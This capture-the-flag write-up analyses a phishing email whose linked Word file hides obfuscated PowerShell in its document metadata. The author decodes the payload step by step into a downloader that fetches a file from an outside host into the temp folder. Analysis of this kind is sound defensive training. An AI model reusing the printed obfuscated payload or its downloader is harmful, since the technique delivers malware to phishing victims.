# Description

```
Goal: You received this email.  Determine what is going on, find the flag, win points.

RE:Bill for September

Hello, I sent it last week to accounting.
But you can have it too.
Invoice Portal: https://tinyurl.com/yb9htn3j
Give me a call when you get this.
Thank you,
Max Bogosity 

Sent from my iPad

On Fri, Sept 29, 2017 at 01:17 , you wrote:
Max, 

Don't forget to send me the bill.

Thank you
```

# Solution

Ok, fetch the url and look at the result.

```
$ curl -Lo output https://tinyurl.com/yb9htn3j
$ file output
output: Microsoft Word 2007+
```

Word 2007+ which means it's really a zip file with a bunch of XML inside.

```
$ mv output output.zip
$ unzip output.zip
Archive:  output.zip
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: word/_rels/document.xml.rels
  inflating: word/document.xml
  inflating: word/vbaProject.bin
 extracting: word/media/image1.jpeg
  inflating: word/_rels/vbaProject.bin.rels
  inflating: word/theme/theme1.xml
  inflating: word/vbaData.xml
  inflating: word/settings.xml
  inflating: docProps/app.xml
  inflating: word/fontTable.xml
  inflating: docProps/core.xml
  inflating: word/styles.xml
  inflating: docProps/custom.xml
  inflating: word/webSettings.xml
```

Time to go poking around, my favorite poking around tool? vi.

Huh, what's this... powershell embded in the XML?

```
$ cat docProps/core.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>Something Phishy</dc:title><dc:subject></dc:subject><dc:creator></dc:creator><cp:keywords></cp:keywords><dc:description>powershell   " &amp; ( $ENV:CoMsPeC[4,24,25]-JoiN'')("$( seT-iTem  'varIAbLe:Ofs' '') "+ [sTRINg]('36~119_115m99~114X105m112o116f32h61f32o110f101y119h45X111o98m106X101o99f116_32o45G67f111_109~79y98m106y101m99f116f32y87G83o99o114f105G112&amp;116X46h83o104h101G108G108_59y36y119f101&amp;98G99~108m105_101G110~116X32~61X32~110G101_119X45h111f98h106f101~99m116~32f83m121X115&amp;116&amp;101f109~46G78X101&amp;116X46_87y101X98o67&amp;108_105y101y110m116o59G36_114h97_110h100m111_109m32h61f32y110h101f119f45f111m98h106X101G99f116_32o114~97y110h100&amp;111_109~59&amp;36&amp;117f114G108y115h32~61o32h39~104_116&amp;116y112G58~47G47G98&amp;104X97y100y102&amp;105~101G108o100y46_53o103&amp;98~102X114_101m101X46~99m111o109_47f115y114G70&amp;78_47_102h72y111o80~39m46~83_112&amp;108G105o116f40f39y44X39h41f59&amp;36m110f97m109f101m32&amp;61y32~39G102o39&amp;32o43o32X39y108X39f32y43~32_39G97y39f32~43m32m39f103y39m59y36~112y97f116G104h32h61f32~36y101y110G118_58y116X101f109X112G32m43X32m39G92y39G32o43f32~36m110X97m109h101m32&amp;43_32&amp;39o46y116~120m116G39G59&amp;102f111&amp;114_101y97&amp;99G104G40_36o117&amp;114G108h32&amp;105X110_32~36X117m114o108f115m41y123f116f114h121G123f36&amp;119y101&amp;98m99G108G105y101y110&amp;116o46X68y111h119G110o108h111o97f100y70_105y108h101X40&amp;36_117f114y108X46f84&amp;111f83G116X114_105o110&amp;103y40&amp;41~44X32_36~112o97o116&amp;104y41h59y98G114_101X97_107~59y125~99~97X116h99y104&amp;123G119X114o105y116X101o45y104G111&amp;115h116f32_36f95o46&amp;69G120m99~101y112&amp;116y105m111&amp;110~46h77m101G115h115&amp;97~103o101&amp;59y125m125'-SpLit 'm' -split 'y'-sPliT'f'-spLIT'X' -SPliT'G'-splIt '_' -spLIT 'o' -SPlIt '~'-sPlIt '&amp;'-spliT'h' | FOReACh-ObjecT { ( [iNt]$_-As[char])})+" $( Set-iTEM  'vARIAbLE:oFS' ' ' ) ")"</dc:description><cp:lastModifiedBy></cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2017-10-05T19:19:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2017-10-05T23:07:00Z</dcterms:modified></cp:coreProperties>
```

Wonder what it does?  Mostly, it looks like string operations,
which we should be able to execute by hand once we get rid of some
of the escaping for XML.

First, substitute `&` for each occurence of `&amp;`, i.e. `:s/&amp;/&/g`

It's still a nasty string of stuff... let's eval part of it.

The calls to `split` break the string up until you're left
with just numbers.



```
PS C:\Users\jason\Desktop> [sTRINg]('36~119_115m99~114X105m112o116f32h61f32o110f101y119h45X111o98m106X101o99f116_32o45G6
7f111_109~79y98m106y101m99f116f32y87G83o99o114f105G112&116X46h83o104h101G108G108_59y36y119f101&98G99~108m105_101G110~116
X32~61X32~110G101_119X45h111f98h106f101~99m116~32f83m121X115&116&101f109~46G78X101&116X46_87y101X98o67&108_105y101y110m1
16o59G36_114h97_110h100m111_109m32h61f32y110h101f119f45f111m98h106X101G99f116_32o114~97y110h100&111_109~59&36&117f114G10
8y115h32~61o32h39~104_116&116y112G58~47G47G98&104X97y100y102&105~101G108o100y46_53o103&98~102X114_101m101X46~99m111o109_
47f115y114G70&78_47_102h72y111o80~39m46~83_112&108G105o116f40f39y44X39h41f59&36m110f97m109f101m32&61y32~39G102o39&32o43o
32X39y108X39f32y43~32_39G97y39f32~43m32m39f103y39m59y36~112y97f116G104h32h61f32~36y101y110G118_58y116X101f109X112G32m43X
32m39G92y39G32o43f32~36m110X97m109h101m32&43_32&39o46y116~120m116G39G59&102f111&114_101y97&99G104G40_36o117&114G108h32&1
05X110_32~36X117m114o108f115m41y123f116f114h121G123f36&119y101&98m99G108G105y101y110&116o46X68y111h119G110o108h111o97f10
0y70_105y108h101X40&36_117f114y108X46f84&111f83G116X114_105o110&103y40&41~44X32_36~112o97o116&104y41h59y98G114_101X97_10
7~59y125~99~97X116h99y104&123G119X114o105y116X101o45y104G111&115h116f32_36f95o46&69G120m99~101y112&116y105m111&110~46h77
m101G115h115&97~103o101&59y125m125'-SpLit 'm' -split 'y'-sPliT'f'-spLIT'X' -SPliT'G'-splIt '_' -spLIT 'o' -SPlIt '~'-sPl
It '&'-spliT'h')
>>
36 119 115 99 114 105 112 116 32 61 32 110 101 119 45 111 98 106 101 99 116 32 45 67 111 109 79 98 106 101 99 116 32 87
83 99 114 105 112 116 46 83 104 101 108 108 59 36 119 101 98 99 108 105 101 110 116 32 61 32 110 101 119 45 111 98 106 101
99 116 32 83 121 115 116 101 109 46 78 101 116 46 87 101 98 67 108 105 101 110 116 59 36 114 97 110 100 111 109 32 61 32
110 101 119 45 111 98 106 101 99 116 32 114 97 110 100 111 109 59 36 117 114 108 115 32 61 32 39 104 116 116 112 58 47 47
98 104 97 100 102 105 101 108 100 46 53 103 98 102 114 101 101 46 99 111 109 47 115 114 70 78 47 102 72 111 80 39 46 83
112 108 105 116 40 39 44 39 41 59 36 110 97 109 101 32 61 32 39 102 39 32 43 32 39 108 39 32 43 32 39 97 39 32 43 32 39
103 39 59 36 112 97 116 104 32 61 32 36 101 110 118 58 116 101 109 112 32 43 32 39 92 39 32 43 32 36 110 97 109 101 32 43
32 39 46 116 120 116 39 59 102 111 114 101 97 99 104 40 36 117 114 108 32 105 110 32 36 117 114 108 115 41 123 116 114 121
123 36 119 101 98 99 108 105 101 110 116 46 68 111 119 110 108 111 97 100 70 105 108 101 40 36 117 114 108 46 84 111 83 116
114 105 110 103 40 41 44 32 36 112 97 116 104 41 59 98 114 101 97 107 59 125 99 97 116 99 104 123 119 114 105 116 101 45 104
111 115 116 32 36 95 46 69 120 99 101 112 116 105 111 110 46 77 101 115 115 97 103 101 59 125 125
```

The `FOReACh-ObjecT { ( [iNt]$_-As[char])})` part converts the numbers into characters:

```
PS C:\Users\jason\Desktop> ([sTRINg]('36~119_115m99~114X105m112o116f32h61f32o110f101y119h45X111o98m106X101o99f116_32o45G
67f111_109~79y98m106y101m99f116f32y87G83o99o114f105G112&116X46h83o104h101G108G108_59y36y119f101&98G99~108m105_101G110~11
6X32~61X32~110G101_119X45h111f98h106f101~99m116~32f83m121X115&116&101f109~46G78X101&116X46_87y101X98o67&108_105y101y110m
116o59G36_114h97_110h100m111_109m32h61f32y110h101f119f45f111m98h106X101G99f116_32o114~97y110h100&111_109~59&36&117f114G1
08y115h32~61o32h39~104_116&116y112G58~47G47G98&104X97y100y102&105~101G108o100y46_53o103&98~102X114_101m101X46~99m111o109
_47f115y114G70&78_47_102h72y111o80~39m46~83_112&108G105o116f40f39y44X39h41f59&36m110f97m109f101m32&61y32~39G102o39&32o43
o32X39y108X39f32y43~32_39G97y39f32~43m32m39f103y39m59y36~112y97f116G104h32h61f32~36y101y110G118_58y116X101f109X112G32m43
X32m39G92y39G32o43f32~36m110X97m109h101m32&43_32&39o46y116~120m116G39G59&102f111&114_101y97&99G104G40_36o117&114G108h32&
105X110_32~36X117m114o108f115m41y123f116f114h121G123f36&119y101&98m99G108G105y101y110&116o46X68y111h119G110o108h111o97f1
00y70_105y108h101X40&36_117f114y108X46f84&111f83G116X114_105o110&103y40&41~44X32_36~112o97o116&104y41h59y98G114_101X97_1
07~59y125~99~97X116h99y104&123G119X114o105y116X101o45y104G111&115h116f32_36f95o46&69G120m99~101y112&116y105m111&110~46h7
7m101G115h115&97~103o101&59y125m125'-SpLit 'm' -split 'y'-sPliT'f'-spLIT'X' -SPliT'G'-splIt '_' -spLIT 'o' -SPlIt '~'-sP
lIt '&'-spliT'h' | FOReACh-ObjecT { ( [iNt]$_-As[char])}))
$ w s c r i p t   =   n e w - o b j e c t   - C o m O b j e c t   W S c r i p t . S h e l l ; $ w e b c l i e n t   =   
n e w - o b j e c t   S y s t e m . N e t . W e b C l i e n t ; $ r a n d o m   =   n e w - o b j e c t   r a n d o m ; 
$ u r l s   =   ' h t t p : / / b h a d f i e l d . 5 g b f r e e . c o m / s r F N / f H o P ' . S p l i t ( ' , ' ) ; 
$ n a m e   =   ' f '   +   ' l '   +   ' a '   +   ' g ' ; $ p a t h   =   $ e n v : t e m p   +   ' \ '   +   $ n a m 
e   +   ' . t x t ' ; f o r e a c h ( $ u r l   i n   $ u r l s ) { t r y { $ w e b c l i e n t . D o w n l o a d F i l 
e ( $ u r l . T o S t r i n g ( ) ,   $ p a t h ) ; b r e a k ; } c a t c h { w r i t e - h o s t   $ _ . E x c e p t i 
o n . M e s s a g e ; } }
```

And for style, getting rid of the spaces by appending `-split ' '-join''` leaves us with:

```
$wscript=new-object-ComObjectWScript.Shell;$webclient=new-objectSystem.Net.WebClient;$random=new-objectrandom;$urls='http://bhadfield.5gbfree.com/srFN/fHoP'.Split(',');$name='f'+'l'+'a'+'g';$path=$env:temp+'\'+$name+'.txt';foreach($urlin$urls){try{$webclient.DownloadFile($url.ToString(),$path);break;}catch{write-host$_.Exception.Message;}}
```

Making it pretty:

```
$wscript=new-object-ComObjectWScript.Shell;
$webclient=new-objectSystem.Net.WebClient;
$random=new-objectrandom;
$urls='http://bhadfield.5gbfree.com/srFN/fHoP'.Split(',');
$name='f'+'l'+'a'+'g';
$path=$env:temp+'\'+$name+'.txt';
foreach($urlin$urls){
  try{
    $webclient.DownloadFile($url.ToString(),$path);
    break;
  }catch{
    write-host$_.Exception.Message;
  }
}
```

Hmm, there's a URL in there... let's see what it has for us.

```
$ curl -o xxx http://bhadfield.5gbfree.com/srFN/fHoP
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    32  100    32    0     0      5      0  0:00:06  0:00:06 --:--:--     8
artemisia:docProps jason$ ls -l xxx
-rw-r--r--  1 jason  staff    32 Oct 17 11:33 xxx
artemisia:docProps jason$ cat xxx
ZmxhZ3tIb29rZWRPblBoaXNoaW5nfQ==
$ (cat xxx; echo '')| openssl base64 -d
flag{HookedOnPhishing}
```

The `echo ''` is to insert a newline (openssl's base64 decoder needs the final newline
for some reason and the URL doesn't supply one).
